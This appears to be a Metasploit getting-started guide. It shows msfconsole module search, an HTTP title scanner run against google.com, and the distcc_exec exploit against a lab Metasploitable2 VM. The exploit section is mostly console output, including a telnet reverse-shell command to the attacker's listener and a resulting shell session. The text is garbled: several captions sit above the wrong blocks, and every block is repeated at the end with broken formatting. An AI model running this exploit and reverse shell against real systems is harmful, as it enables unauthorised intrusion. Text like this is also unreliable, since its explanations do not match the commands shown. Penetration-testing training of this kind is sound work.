## Getting started
Assuming you have installed Metasploit, either with the official Rapid7 nightly installers or through Kali, you can use the `msfconsole` command to open Metasploit:
```msf
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.3.35-dev-0fc88a8050               ]
+ -- --=[ 2357 exploits - 1227 auxiliary - 413 post       ]
+ -- --=[ 1387 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

### Finding modules
You can use the `search` command to search for modules:
```msf
msf6 > search type:auxiliary http html title tag

Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/title                   normal  No     HTTP HTML Title Tag Content Grabber


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/title

msf6 >
```

active module:
```msf
msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > 
```

### Running Auxiliary modules
extracting the HTTP title from a server:
```msf
msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > 
```

Each module offers configurable options which can be viewed with the `show options`, or aliased `options`, command:
```msf
msf6 auxiliary(scanner/http/title) > show options

Module options (auxiliary/scanner/http/title):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SHOW_TITLES  true             yes       Show the titles on the console as they are grabbed
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   STORE_NOTES  true             yes       Store the captured information in notes. Use "notes -t http.title" to view
   TARGETURI    /                yes       The base path
   THREADS      1                yes       The number of concurrent threads (max one per host)
   VHOST                         no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/title) > 
```

the module will run against:
```msf
msf6 auxiliary(scanner/http/title) > set RHOSTS google.com
RHOSTS => google.com
```

The `run` command will run the module against the target, showing the target's HTTP title:
```msf
msf6 auxiliary(scanner/http/title) > run

[+] [142.250.180.14:80] [C:301] [R:http://www.google.com/] [S:gws] 301 Moved
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

both `RHOSTS` and enabling `HttpTrace` functionality:
```msf
msf6 > use unix/misc/distcc_exec
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > 
```

### Running exploit modules
For instance - targeting a vulnerable Metasploitable2 VM and using the `unix/misc/distcc_exec` module:
```msf
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/misc/distcc_exec) > 
```

Each module offers configurable options which can be viewed with the `show options`, or aliased `options`, command:
```msf
msf6 exploit(unix/misc/distcc_exec) > set rhost 192.168.123.133
rhost => 192.168.123.133
msf6 exploit(unix/misc/distcc_exec) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
```

For this scenario you can manually set each of the required option values (`RHOST`, `LHOST`, and optionally `PAYLOAD`):
```msf
msf6 exploit(unix/misc/distcc_exec) > run

[+] sh -c '(sleep 4375|telnet 192.168.123.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.123.1 4444 >/dev/null 2>&1 &)'
[*] Started reverse TCP double handler on 192.168.123.1:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo BmpMGFX6NDVlh5h0;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "BmpMGFX6NDVlh5h0\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.123.1:4444 -> 192.168.123.133:48578) at 2023-09-21 14:42:42 +0100

whoami
daemon
```

The `run` command will run the module against the target, there is also an aliased `exploit` command which will perform the same action:
```msf
msf6 exploit(unix/misc/distcc_exec) > run rhost=192.168.123.133 lhost=192.168.123.1 payload=cmd/unix/reverse

[+] sh -c '(sleep 4305|telnet 192.168.123.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.123.1 4444 >/dev/null 2>&1 &)'
[*] Started reverse TCP double handler on 192.168.123.1:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo QqL1Uzom6eBFilyL;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "QqL1Uzom6eBFilyL\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.123.1:4444 -> 192.168.123.133:52314) at 2023-09-21 13:52:40 +0100

whoami
daemon
```

`msf
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.3.35-dev-0fc88a8050               ]
+ -- --=[ 2357 exploits - 1227 auxiliary - 413 post       ]
+ -- --=[ 1387 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
`

`msf
msf6 > search type:auxiliary http html title tag

Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/title                   normal  No     HTTP HTML Title Tag Content Grabber


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/title

msf6 >
`

`msf
msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > 
`

`msf
msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > 
`

`msf
msf6 auxiliary(scanner/http/title) > show options

Module options (auxiliary/scanner/http/title):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SHOW_TITLES  true             yes       Show the titles on the console as they are grabbed
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   STORE_NOTES  true             yes       Store the captured information in notes. Use "notes -t http.title" to view
   TARGETURI    /                yes       The base path
   THREADS      1                yes       The number of concurrent threads (max one per host)
   VHOST                         no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/title) > 
`

`msf
msf6 auxiliary(scanner/http/title) > set RHOSTS google.com
RHOSTS => google.com
`

`msf
msf6 auxiliary(scanner/http/title) > run

[+] [142.250.180.14:80] [C:301] [R:http://www.google.com/] [S:gws] 301 Moved
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
`

`msf
msf6 > use unix/misc/distcc_exec
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > 
`

`msf
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/misc/distcc_exec) > 
`

`msf
msf6 exploit(unix/misc/distcc_exec) > set rhost 192.168.123.133
rhost => 192.168.123.133
msf6 exploit(unix/misc/distcc_exec) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
`

`msf
msf6 exploit(unix/misc/distcc_exec) > run

[+] sh -c '(sleep 4375|telnet 192.168.123.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.123.1 4444 >/dev/null 2>&1 &)'
[*] Started reverse TCP double handler on 192.168.123.1:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo BmpMGFX6NDVlh5h0;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "BmpMGFX6NDVlh5h0\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.123.1:4444 -> 192.168.123.133:48578) at 2023-09-21 14:42:42 +0100

whoami
daemon
`

`msf
msf6 exploit(unix/misc/distcc_exec) > run rhost=192.168.123.133 lhost=192.168.123.1 payload=cmd/unix/reverse

[+] sh -c '(sleep 4305|telnet 192.168.123.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.123.1 4444 >/dev/null 2>&1 &)'
[*] Started reverse TCP double handler on 192.168.123.1:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo QqL1Uzom6eBFilyL;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "QqL1Uzom6eBFilyL\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.123.1:4444 -> 192.168.123.133:52314) at 2023-09-21 13:52:40 +0100

whoami
daemon
`

